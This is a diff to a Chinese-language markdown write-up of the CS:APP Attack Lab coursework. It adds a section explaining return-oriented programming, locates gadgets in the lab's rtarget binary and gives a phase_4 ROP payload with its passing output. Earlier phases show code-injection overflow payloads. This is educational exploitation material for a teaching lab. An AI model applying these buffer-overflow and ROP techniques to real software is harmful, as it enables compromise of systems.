@@ -7,10 +7,13 @@
     - [提交](#提交)
     - [说明](#说明)
   - [正式开始](#正式开始)
-    - [pahse\_1](#pahse_1)
-    - [phase\_2](#phase_2)
-    - [phase\_3](#phase_3)
-    - [phase\_4](#phase_4)
+    - [Code Injection Attack](#code-injection-attack)
+      - [pahse\_1](#pahse_1)
+      - [phase\_2](#phase_2)
+      - [phase\_3](#phase_3)
+    - [Return-Oriented Programming](#return-oriented-programming)
+      - [phase\_4](#phase_4)
+      - [phase\_5](#phase_5)
 
 
 ## 准备
@@ -81,7 +84,9 @@ unsigned getbuf()
 
 ## 正式开始
 
-### pahse_1
+### Code Injection Attack
+
+#### pahse_1
 
 参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.1` 的部分
 
@@ -137,7 +142,7 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
 ```
 
-### phase_2
+#### phase_2
 
 参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.2` 的部分
 
@@ -259,7 +264,7 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
 ```
 
-### phase_3
+#### phase_3
 
 参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.3` 的部分
 
@@ -433,5 +438,95 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:3:48 8D 24 25 78 DC 61 55 48 8D 3C 25 90 DC 61 55 68 FA 18 40 00 C3 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
 ```
 
-### phase_4
+### Return-Oriented Programming
+
+从这一阶段开始将会介绍一种新的代码攻击方式 `ROP, Return-Oriented Programming`，直译就是**面向返回值编程**，提出这种攻击方式是因为：
+
+* 栈随机化：程序运行时栈的位置每次都会变化，我们无法定位堆栈的地址（虽然栈的地址是随机的，但函数的入口地址已经不会发生改变）
+* 可执行区域限制：栈内的代码被标记为不可执行，如果执行的话会报 `segmenttation fault`
+
+下面我们详细说明一下 `ROP` 的编程思想：
+
+`ROP` 的核心在于 `ret` 指令，该指令可以分解为：`PC = *rsp, rsp++`，也就是会将当前**栈顶**处的**地址**赋值给 `PC` ，然后将栈顶指针向上增加 `64` 个字节（一定是将地址返回给 `PC` ，而**不是指令的字节序列**）
+
+在一段程序中，如果一个 `ret` 指令前的字节序列，恰好可以由我们需要的指令的字节级编码前后拼接而成，便可以实现 `ROP`，我们称这一个连续的指令序列为 `gadget`
+
+我们来看书中的例子：
+
+```assembly
+400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
+400f1b: c3 retq
+```
+
+这是一段正常的代码。但字节序列 `48 89 c7` 可以被翻译为 `movq %rax, %rdi` ，并且后面接的正好是 `ret` ，因此便可以实现 `ROP`
+
+这里有一个疑问是，为什么一定要以 `ret` 为结尾，这一点将在 `phase_4` 中得到解答
+
+#### phase_4
+
+参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `5.1` 的部分，这个实验一定要将 `PDF` 中的内容全部理解，不然做不下去
+
+我们需要在 `rtarget` 中完成 `phase_2` 一样的任务，只不过 `rtarget` 与 `ctarget` 不同的是加入了上面的两种防止缓冲器攻击的机制
+
+核心思想还是先对 `%rdi` 进行赋值，然后跳转到 `touch2` 的地址即可
+
+由于我们不能将立即数直接赋值给一个寄存器，因此我们需要将立即数赋值给寄存器，然后再将这个寄存器赋值给 `%rdi`
+
+我们可以考虑用 `pop` 指令来对寄存器进行赋值，然后再用 `mov` 指令对 `%rdi` 进行赋值
+
+查表发现，`pop %rax` 的字节级编码为 `58` ，我们在 `rtarget` 中搜索 `58` 的位置，得到如下结果：
+
+```assembly
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	ret    
+```
+
+字节 `90` 为 `nop` 的字节级编码，因此可以直接忽视
+
+我们需要的地址从 `0x4019ab` 开始，然后以 `c3` 结束（也就是以 `ret` 结束）
+
+因此**我们将地址 `0x4019ab` 注入到堆栈中，覆盖原先 `getbuf` 的返回值，这样就可以让 `PC` 跳到我们指定的位置了**
+
+**当执行 `ret` 之后，`PC` 会回到原先的位置，如果后面还有一次我们注入的地址，那么就会再执行一次刚刚的行为**，所以这就是为什么一定要以 `ret` 为结尾
+
+在我们从栈中弹出 `cookie` 后，我们需要执行 `mov %rax, %rdi`，该指令的字节级编码为：`48 89 c7`，我们找到：
+
+```assembly
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	ret    
+```
+
+我们需要的地址为 `0x4019c5`，到此我们也就执行完所有需要的指令了，之后将 `touch2` 的地址写入栈中即可
+
+答案如下：
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+执行结果：
+
+```bash
+$ ./rtarget -qi ./answer/phase_4/output 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+
+#### phase_5
 
